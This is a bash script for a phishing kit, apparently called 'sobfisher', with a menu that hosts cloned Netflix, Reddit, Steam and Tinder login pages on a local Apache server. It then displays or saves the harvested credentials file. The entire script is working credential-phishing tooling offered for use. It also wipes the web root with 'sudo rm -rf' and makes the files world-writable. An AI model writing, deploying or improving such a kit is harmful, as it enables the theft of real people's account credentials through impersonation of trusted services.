#!/bin/bash

echo "
 ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                                             
            
Note!> Ma tmovi 7ta chi 7aja layrdi elk :)                                                                                                                 
"

open_netflix() {
	echo "Opening Netflix page..."
	sudo rm -rf /var/www/html/*
	cd /home/kali/Desktop/sobfisher/netflix || { echo "Failed to change directory."; return 1; }
	sudo cp -r /home/kali/Desktop/sobfisher/netflix/* /var/www/html
	sudo chmod 777 /var/www/html/*
	sudo systemctl restart apache2
    
}

open_reddit() {
    echo "Opening Reddit page..."
	sudo rm -rf /var/www/html/*
	cd /home/kali/Desktop/sobfisher/reddit || { echo "Failed to change directory."; return 1; }
	sudo cp -r /home/kali/Desktop/sobfisher/reddit/* /var/www/html/
	sudo chmod 777 /var/www/html/*
	sudo systemctl restart apache2
}

open_steam() {
	echo "Opening Steam page..."
	sudo rm -rf /var/www/html/*
	cd /home/kali/Desktop/sobfisher/steam || { echo "Failed to change directory."; return 1; }
	sudo cp -r /home/kali/Desktop/sobfisher/steam/* /var/www/html/
	sudo chmod 777 /var/www/html/*
	sudo systemctl restart apache2
}

open_tinder() {
	echo "Opening Tinder page..."
	sudo rm -rf /var/www/html/*
	cd /home/kali/Desktop/sobfisher/tinder || { echo "Failed to change directory."; return 1; }
	sudo cp -r /home/kali/Desktop/sobfisher/tinder/* /var/www/html
	sudo chmod 777 /var/www/html/*
	sudo systemctl restart apache2

}

cat_credentials() {
    echo "**********************************"
    echo "Content of credentials file:"
    cat /var/www/html/credentials.txt
    echo "**********************************"
}



save_credentials() {
	read -p "Enter the path to save the credentials file: " save_path
	if [ -d "$save_path" ]; then
		cp /var/www/html/credentials.txt "$save_path"
		echo "Credentials file saved to $save_path/credentials.txt"
	else
		echo "Invalid path: $save_path. Please provide a valid directory."
	fi
}

# Main menu function
main_menu() {
	echo "===== Main Menu ====="
	echo "1. Open Netflix page"
	echo "2. Open Reddit page"
	echo "3. Open Steam page"
	echo "4. Open Tinder page"
	echo "5. Quit"

	read -p "Enter your choice: " choice

	case $choice in
		1) sub_menu "Netflix" ;;
		2) sub_menu "Reddit" ;;
		3) sub_menu "Steam" ;;
		4) sub_menu "Tinder" ;;
		5) echo "Goodbye!"; exit ;;
		*) echo "Invalid option. Please enter a number from 1 to 5." ;;
	esac
}

# Sub-menu function
sub_menu() {
	local keep_sub_menu=true
	while $keep_sub_menu; do
		echo "===== $1 Sub-Menu ====="
		echo "1. Host Page"
		echo "2. View credentials"
		echo "3. Save credentials file"
		echo "4. Back to main menu"

		read -p "Enter your choice: " choice

		case $choice in
			1) 
				case "$1" in
					Netflix) open_netflix ;;
					Reddit) open_reddit ;;
					Steam) open_steam ;;
					Tinder) open_tinder ;;
				esac
				;;
			2) cat_credentials ;;
			3) save_credentials ;;
			4) 
				echo "Returning to main menu..."
				keep_sub_menu=false
				;;
			*) echo "Invalid option. Please enter a number from 1 to 4." ;;
		esac
	done
}

# Main program
while true; do
	main_menu
done